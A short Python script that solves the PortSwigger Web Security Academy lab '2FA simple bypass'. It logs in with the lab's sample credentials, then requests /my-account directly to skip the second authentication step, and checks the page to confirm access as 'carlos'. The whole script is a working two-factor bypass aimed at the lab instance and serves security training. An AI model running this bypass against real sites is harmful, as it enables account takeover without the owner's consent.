################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 26/8/2023
#
# PortSwigger LAB: 2FA simple bypass
#
# Steps: 1. Login as carlos
#        2. Extract the session from the Set-Cookie header
#        3. Request /login2 using the extracted session
#        4. Request /my-account directly bypassing 2FA
#
#################################################################

# imports
import requests
import re
from colorama import Fore

# change this url
url = "https://0acb000b0300fa0f82fe6089002f001d.web-security-academy.net"

# make a new session to use in subsequent request
client = requests.session()

# valid credentials to POST
data = {
    "username": "carlos",
    "password": "montoya"
}

try: # try to login as carlos
    login = client.post(f"{url}/login", data, allow_redirects=False)
    if login.status_code == 302: # if logging in succeeded
        print("1. Logged in as carlos.. ☑️")
        try: # try to GET the /login2 
            login2 = client.get(f"{url}/login2")
            if login2.status_code == 200: # if request to /login2 succeeded
                print("2. GET /login2 using extracted session.. ☑️")
                try: # try to GET /my-account directrly
                    home_res = client.get(f"{url}/my-account?id=carlos")
                    if home_res.status_code == 200: # if you get to the home page successfully
                        print("3. GET /my-account directly bypassing 2FA.. ☑️")
                        pattern = re.findall( # search for carlos in the body to make sure that you logged in as carlos
                            "Your username is: carlos", home_res.text)
                        if len(pattern) != 0: # if pattern was found
                            print(Fore.GREEN + "✅ Logged in successfully as Carlos")
                        else:
                            print(Fore.RED + "Failed to login as Carlos")
                    else:
                        print(Fore.RED + "Requesting /my-account page failed")
                except:
                    print(Fore.RED + "Requesting /my-account page failed through exception")
            else:
                print(Fore.RED + "Requesting /login2 page failed through exception")
        except:
            print(Fore.RED + "Requesting /login2 page failed through exception")
except:
    print(Fore.RED + "Login request failed through exception")
